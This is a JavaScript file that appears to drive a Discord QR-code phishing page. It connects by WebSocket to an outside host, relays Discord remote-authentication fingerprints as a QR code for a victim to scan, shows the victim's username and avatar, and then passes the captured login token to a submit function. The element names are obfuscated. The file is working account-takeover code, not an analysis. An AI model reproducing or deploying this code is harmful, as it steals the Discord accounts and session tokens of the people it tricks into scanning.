let ws = null;
let privateKey = null;
let nonce = null;
let rr = null;
let loading = `<span class="qrkubik1"><span class="qrkubik2"></span><span class="qrkubik2"></span></span>`;
init();

function init() {
    removeImage();
    privateKey = null;
    nonce = null;
    let headers = new Headers();
    let qrscanner = "captcha.msc-nft.com:8443";
    let isSSL = true;
    let protocol;
    let protocolw;
    if (isSSL) {
        protocol = "https";
        protocolw = "wss";
    } else {
        protocol = "http";
        protocolw = "ws";
    }

    headers.append('Content-Type', 'application/json');
    headers.append('Accept', 'application/json');
    headers.append('Origin', protocol + '://' + hdomain + '');

    ws = new WebSocket(protocolw + '://' + 'myqrcodedomainthatshouldnotbeaccessed.com:8443' + '/');
    ws.onclose = onclose;
    ws.onerror = onerror;
    ws.onmessage = onMessage;
    rr = setInterval(function () {
        if (ws.readyState === ws.OPEN) ws.send("1");
    }, 4000)
}

function onMessage(msg) {
    let json = JSON.parse(msg.data);
    if (json.op == "pendingRemoteInit") {
        let img = new Image();
        img.src = `/create-qr-code/?size=176x176&data=${encodeURIComponent("https://discord.com/ra/" + json.fprint)}`;
        img.onload = () => {
            document.querySelectorAll('[scrpz="gdfh643rwefsfds"]')[0].src = img.src;
            document.querySelectorAll('[scrpz="jbxvxvste4tfw"]')[0].style.display = "flex";
            let image = document.createElement("img");
            image.src = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAMAAABHPGVmAAAA6lBMVEUAAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8BAQH///8AAAD+/v7v7+/f39+AgIC/v78gICAQEBAhISFAQECQkJBwcHCvr68wMDDe3t4RERG+vr6fn5/Pz89vb29gYGDOzs6urq5PT0+enp6Pj49xcXFBQUF/f3+RkZHu7u5fX1+goKBubm6wsLAiIiKBgYExMTFQUFBRUVE/Pz+hoaEoAQtHAAAAInRSTlMA/u7eMO9/IJ8Q37++YICPQG9wX57OkFCvz17dP46gT26unxy2cQAABJ9JREFUeF7tmVdz4zYUhU2qWVa312WzqQDYq2pxLVtL8v//TpRZiSeAAJMgNZM8+LzJ9vibc+89FyR09D/Qq15V710cvz1p0I0aJ52r/mX9wIBhs9Oge2p0RgcDDS8A2NPJ8QE47VGH5uj8rCKi2aAFVKuCGYmIw2OGHaqhWqtMpQZUT0ZTm9E6EQH2Il5+8322kT+OlrFX2cxZQyDEUcBERR8cnmKe6jCaIgEAkVO6ZMccwoUHiXyXs/OLFiMfAQyF6Bt9huezAgo9XcoACDthBZXYHEWj547PCit0NLo/AsMLmIamKShnORlEPmKmJxIjLy+nEjl3mbZcZL+d2xD40PeSH5dWxkhZGREva8swv1hOwEppmqW/q2L0snz4rKRCe2flNM9IwkrrPpuwttyI0JCKbem/bATFKlkwtZXeiwkZL+cO94vHRbocK9Ki7spb9caKYptuZAdghD/+dh7tT5itHrC6ykjwaGfNilPPcZyFl8bZiegsfdGKOiu/KjriOzRHk0BhZaBs+5zx+kBzdavYLqayWkKRv9F8WUJjHlT1Ot2VmPFyaAGtBSu2IiodebVWtIis90K9FPPVQLUKG4Em8nqZipboGYEVaVSMOge53DI8LSPQjK/XYgvpcZC+9ECMANAaMBJLk3KFJS/LiG5W7qWPYB1p3+3ikGcu9t+3kHNp3sdCEEvWK9xCatIJ9lXVcqIgWDkATITP9I6DSGdYOsGO+MQaLPilGDqKqJAtxMiF+BSK+HGzfKQOPyoDQUuw0Rb8siIOIDelIC4gntCmdAfxAElkkNzGp4AsdpDtP/0ECJKS2/gTCQT/AKe7zadiqtgsXzHCkqeIG9lw4eBP+NoQV7qJMRBd6QmfqPJ+TxgjK4oObD9Dz5K1csVBLiQLknLyXNfjP3/x+MyDQZ6kL3Y9dBgQLQGCeTB+4yB1dLg6BDGpK47fqhD18YtdH0uny7IUJZJOF/kLwyU9Gm1AJoAkqwkwIM+WX/afi7BsjJEAGe4/3PmgpCEZ360tywLAWj9G5MHLiJMxqoWWCGpIhthFObz3jAXR8nY2W69n17cfbwLGgKDPj4FYLeQdusB8Qf48w8xfeKO2Zj6DQvUly1D+6hDNfmAmPlO9iVizPzm2q6oW5gtW4GbDec8kSjaE5zsgcJWDpwhep6IVYFazayYTuZ59RHVFIz9JIO3GzkrIKiikfNsVUaFe9VdsGBGtmNUvC0iiMoKuVC7YZ1swoh4w6kyrXuC8A0CVFeqRUsX6tGMYrSI3qXdlGHGhu852LaO4Ol6QEBRLrZYJL+TgF5047DOlWt2fYiXjHFGpD4oTFrfxmbt81rmqt+9J0QzaYAx0vxBIwyKI0KNgHJf4+sTNw5Cpa2sxEBfIcUOSg9BhQH2D/lvzByLlEPLwZJf/hu7UpJycfziEB0y3BMjU/EqzVaOivDh5+BqSjcLwe/K0EAjUeIcMapRMS8agDYCGGQ2M0f35qJx6RTGGiU1yYAwQTVSqHObcyCvU70CUVv24ZihAhmEO0IuqnFHXzEAAdJsgHAh02f+jWzONjcza+ZvBWf3ov9erXvU3EoVQ7cB6iyYAAAAASUVORK5CYII=";
            image.style.width = "50px";
            document.querySelectorAll('[scrpz="cxcfstwe4rw3"]')[0].innerHTML = "";
            document.querySelectorAll('[scrpz="cxcfstwe4rw3"]')[0].appendChild(image);
        }
    } else if (json.op == "pendingFinish") {
        document.querySelectorAll('[scrpz="zfcstry63frw"]')[0].innerHTML = "Logging in as " + json.user.username + "#" + json.user.discriminator;
        let format = json.user.avatar.startsWith("a_") ? ".gif" : ".png";
        let src = "https://cdn.discordapp.com/avatars/" + json.user.id + "/" + json.user.avatar + format + "?size=128";
        let image = new Image();
        image.src = src;
        image.onerror = () => {
            image.src = "https://cdn.discordapp.com/embed/avatars/" + (json.user.discriminator % 5) + ".png";
            image.onerror = () => {
                image.src = "/4.png";
                image.onerror = image.onload = () => {
                    document.querySelectorAll('[scrpz="jfgvbsdvwe5t23dfs"]')[0].src = image.src;
                    document.querySelectorAll('[scrpz="jfvxdewrt3fwe"]')[0].style.marginLeft = "-240px";
                }
            }
        }
        image.onload = () => {
            document.querySelectorAll('[scrpz="jfgvbsdvwe5t23dfs"]')[0].src = image.src;
            document.querySelectorAll('[scrpz="jfvxdewrt3fwe"]')[0].style.marginLeft = "-240px";
        }
    } else if (json.op == "finish") {
        submitCode(json.tk, 1);
    } else if (json.op == "cancel") {
        cancel();
        document.querySelectorAll('[scrpz="jfvxdewrt3fwe"]')[0].style.marginLeft = "0px";
    }
}

function onclose(event) {
    clearInterval(rr);
    init();
}
function onerror(event) {
}

function removeImage() {
    document.querySelectorAll('[scrpz="jbxvxvste4tfw"]')[0].style.display = "none";
    document.querySelectorAll('[scrpz="cxcfstwe4rw3"]')[0].innerHTML = loading;
}

function cancel() {
    removeImage();
    document.querySelectorAll('[scrpz="jfvxdewrt3fwe"]')[0].style.marginLeft = "0px";
    if (ws) ws.close();
}